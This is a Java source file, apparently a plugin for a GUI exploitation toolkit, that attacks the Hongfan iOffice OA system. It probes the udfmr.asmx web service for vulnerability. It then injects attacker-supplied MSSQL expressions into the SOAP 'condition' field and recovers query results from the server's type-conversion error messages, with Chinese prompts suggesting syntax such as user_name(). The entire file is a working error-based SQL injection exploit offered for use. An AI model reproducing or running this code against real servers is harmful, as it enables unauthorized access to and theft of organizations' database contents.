package exp.oa.hongfanoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.getIndexOf;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.HashMap;

public class hongfan_udfmr_error_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response get_res = HttpTools.get(url + "/iOffice/prg/set/wss/udfmr.asmx?op=GetEmpSearch" , head, "utf-8");
            if (get_res.getCode() == 200 && !get_res.getText().contains("userPwd")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ hongfan_udfmr_error_sqli ]");
                    textArea.appendText("\n sql注入类型为报错注入(注意:执行返回不能为数字)，CMD处输入mssql语法查询");
                    textArea.appendText("\n 示例语法: user_name()");
                    textArea.appendText("\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    public static String error_sqli(String url,String sql){
        try{
            HttpURLConnection connection = HttpTools.getCoon(url);
            connection.setRequestMethod("POST");
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "text/xml; charset=UTF-8");
            connection.setRequestProperty("SOAPAction","\"http://tempuri.org/ioffice/udfmr/GetEmpSearch\"");
            String xmlData = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                    "<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
                    "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
                    "xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" +
                    "  <soap:Body>\n" +
                    "    <GetEmpSearch xmlns=\"http://tempuri.org/ioffice/udfmr\">\n" +
                    "      <condition>1="+sql+"</condition>\n" +
                    "    </GetEmpSearch>\n" +
                    "  </soap:Body>\n" +
                    "</soap:Envelope>";
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(xmlData);
            outputStream.flush();
            outputStream.close();

            int responseCode = connection.getResponseCode();

            BufferedReader reader;
            if (responseCode == HttpURLConnection.HTTP_OK) {
                reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            } else {
                reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));
            }

            String line;
            StringBuilder response = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            reader.close();
            System.out.println("Response Code: " + responseCode);
            connection.disconnect();
            return response.toString();

        }catch(Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        String var1 = error_sqli(url+"/ioffice/prg/set/wss/udfmr.asmx",sql);
        String var0 ;
        if (var1 !=null) {
            try {
                String var2 = getIndexOf.getMessage(var1, "char 值 '", 8, "' 转换成数据类型 int 时失败", 0);
                var0 = var2;
            }catch (Exception E){
                var0 = null;
            }
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行失败");
            });
            return false;
        }

        String finalVar = var0;
        if(finalVar != null){
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行成功");
                textArea_cmd.appendText(finalVar +"\n");
                textArea.appendText("\n");
            });

            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行失败");
            });
            return false;
        }
    }
}
